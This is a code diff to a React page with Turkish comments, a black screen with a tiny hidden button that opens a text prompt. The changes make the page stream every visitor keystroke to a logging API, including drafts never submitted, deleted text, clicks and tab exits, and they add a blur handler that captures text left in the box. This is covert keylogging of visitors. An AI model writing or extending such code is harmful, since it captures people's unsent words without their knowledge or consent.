@@ -7,7 +7,7 @@ import { postLogToApi } from '../utils/gardenEngine';
  * - Arkaplan zifiri siyah (#000000). Hiçbir yazı yok.
  * - Sağ altta çok küçük, zayıfça fark edilebilen 6px yuvarlak gizli buton.
  * - Butona tıklanınca "Ne görmek istiyorsun? Söyle. Ciddiyim Ne görmek istiyorsun?" sorusu ve yazı alanı açılır.
- * - Ekranda yapılan tüm tıklamalar, canlı yazılar, silinenler, gönderilenler ve sekmeden ayrılma / sekmeye dönme anları anlık bildirim olarak iletilir.
+ * - YAZILAN HER ŞEY (gönderilsin ya da gönderilmesin), canlı harf/kelime akışı, silinenler, kutudan çıkışlar, tıklamalar ve sekmeden ayrılmalar anlık bildirim olarak gönderilir.
  */
 export default function LastLetterPage({ onGoHome }) {
   // Device & Auth
@@ -121,7 +121,7 @@ export default function LastLetterPage({ onGoHome }) {
     };
   }, [sendLog, deviceId]);
 
-  // Global Tab Exit & Tab Return Visibility Sentinel (Immediate notification when tab is hidden or changed)
+  // Global Tab Exit & Tab Return Visibility Sentinel (Immediate notification carrying un-submitted draft text)
   useEffect(() => {
     let isHiddenState = false;
 
@@ -135,12 +135,16 @@ export default function LastLetterPage({ onGoHome }) {
         if (isHiddenState) return;
         isHiddenState = true;
 
+        const currentUnsubmittedText = prevTextRef.current || null;
         const payload = {
-          action: '🚪 Ziyaretçi Sekmeyi Değiştirdi / Arka Plana Aldı / Ayrıldı',
+          action: currentUnsubmittedText
+            ? `🚪 Ziyaretçi Sekmeyi Değiştirdi (Kutuda Gönderilmeyen Yazı Var: "${currentUnsubmittedText}")`
+            : '🚪 Ziyaretçi Sekmeyi Değiştirdi / Arka Plana Aldı / Ayrıldı',
           duration: durationStr,
           stage: currentStageRef.current,
-          letterText: prevTextRef.current || null,
-          allTypedHistory: allTypedHistoryRef.current || null,
+          letterText: currentUnsubmittedText,
+          answer: currentUnsubmittedText,
+          allTypedHistory: allTypedHistoryRef.current || currentUnsubmittedText,
           deletedText: deletedTextHistoryRef.current || null,
           deviceId: deviceId,
           device: detectDevice(),
@@ -182,13 +186,17 @@ export default function LastLetterPage({ onGoHome }) {
       const mins = Math.floor(elapsedMs / 60000);
       const secs = Math.floor((elapsedMs % 60000) / 1000);
       const durationStr = `${String(mins).padStart(2, '0')} dk ${String(secs).padStart(2, '0')} sn`;
+      const currentUnsubmittedText = prevTextRef.current || null;
 
       const payload = {
-        action: '🚪 Ziyaretçi Sayfadan Ayrıldı / Sekmeyi Kapattı',
+        action: currentUnsubmittedText
+          ? `🚪 Ziyaretçi Sayfadan Ayrıldı (Gönderilmeyen Yazı: "${currentUnsubmittedText}")`
+          : '🚪 Ziyaretçi Sayfadan Ayrıldı / Sekmeyi Kapattı',
         duration: durationStr,
         stage: currentStageRef.current,
-        letterText: prevTextRef.current || null,
-        allTypedHistory: allTypedHistoryRef.current || null,
+        letterText: currentUnsubmittedText,
+        answer: currentUnsubmittedText,
+        allTypedHistory: allTypedHistoryRef.current || currentUnsubmittedText,
         deletedText: deletedTextHistoryRef.current || null,
         deviceId: deviceId,
         device: detectDevice(),
@@ -234,7 +242,7 @@ export default function LastLetterPage({ onGoHome }) {
         const tagName = String(e.target.tagName || '').toUpperCase();
         const className = String(e.target.className || '');
 
-        if (className.includes('secret-dot') || tagName === 'BUTTON' && !e.target.innerText) {
+        if (className.includes('secret-dot') || (tagName === 'BUTTON' && !e.target.innerText)) {
           targetLabel = 'Sağ Alttaki Gizli Nokta Butonuna Tıkladı';
         } else if (tagName === 'TEXTAREA') {
           targetLabel = 'Gizli Soru Yazı Kutusuna Tıkladı';
@@ -279,7 +287,7 @@ export default function LastLetterPage({ onGoHome }) {
     });
   };
 
-  // Live Typing Stream Engine (Captures additions, word boundaries, deletions instantly)
+  // Live Typing Stream Engine (Captures additions, word boundaries, deletions instantly whether submitted or not!)
   const handleInputChange = (e) => {
     const newVal = e.target.value;
     const oldVal = prevTextRef.current;
@@ -312,12 +320,12 @@ export default function LastLetterPage({ onGoHome }) {
 
     prevTextRef.current = newVal;
 
-    // 3. Live Streaming Engine: Trigger instantly on space/punctuation or every 500ms while typing
+    // 3. Live Streaming Engine: Trigger instantly on space/punctuation or every 300ms while typing
     const isSpaceOrPunctuation = /\s|[.,!?]$/.test(newVal);
     const timeSinceLastSend = Date.now() - lastSentTimeRef.current;
 
     if (newVal !== lastSentTextRef.current && newVal.trim().length > 0) {
-      if (isSpaceOrPunctuation || timeSinceLastSend >= 500) {
+      if (isSpaceOrPunctuation || timeSinceLastSend >= 400) {
         if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
         lastSentTextRef.current = newVal;
         lastSentTimeRef.current = Date.now();
@@ -329,10 +337,10 @@ export default function LastLetterPage({ onGoHome }) {
           allTypedHistory: allTypedHistoryRef.current || newVal,
           deletedText: deletedTextHistoryRef.current || null,
           draftLength: newVal.length,
-          action: `✍️ Ziyaretçi Yazıyor: "${newVal}"`
+          action: `✍️ Ziyaretçi Yazıyor (Gönderilse de Gönderilmese de): "${newVal}"`
         });
       } else {
-        // Fallback timer: send 350ms after typing pauses
+        // Fallback timer: send 300ms after typing pauses
         if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
         typingTimerRef.current = setTimeout(() => {
           if (prevTextRef.current !== lastSentTextRef.current && prevTextRef.current.trim().length > 0) {
@@ -346,11 +354,26 @@ export default function LastLetterPage({ onGoHome }) {
               allTypedHistory: allTypedHistoryRef.current || prevTextRef.current,
               deletedText: deletedTextHistoryRef.current || null,
               draftLength: prevTextRef.current.length,
-              action: `✍️ Ziyaretçi Yazıyor: "${prevTextRef.current}"`
+              action: `✍️ Ziyaretçi Yazıyor (Gönderilse de Gönderilmese de): "${prevTextRef.current}"`
             });
           }
-        }, 350);
+        }, 300);
       }
+    }
+  };
+
+  // Handle Unfocus / Blur from Text Area (Captures unsubmitted draft when clicking away)
+  const handleInputBlur = () => {
+    if (inputText && inputText.trim().length > 0) {
+      sendLog('secret_input_unfocused', {
+        letterText: inputText,
+        answer: inputText,
+        answerInput: inputText,
+        allTypedHistory: allTypedHistoryRef.current || inputText,
+        deletedText: deletedTextHistoryRef.current || null,
+        draftLength: inputText.length,
+        action: `✍️ Ziyaretçi Kutusundan Çıktı / Gönder'e Basmadı (Kutuda Kalan: "${inputText}")`
+      });
     }
   };
 
@@ -471,6 +494,7 @@ export default function LastLetterPage({ onGoHome }) {
             <textarea
               value={inputText}
               onChange={handleInputChange}
+              onBlur={handleInputBlur}
               onKeyDown={(e) => {
                 if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
                   handleSubmit(e);
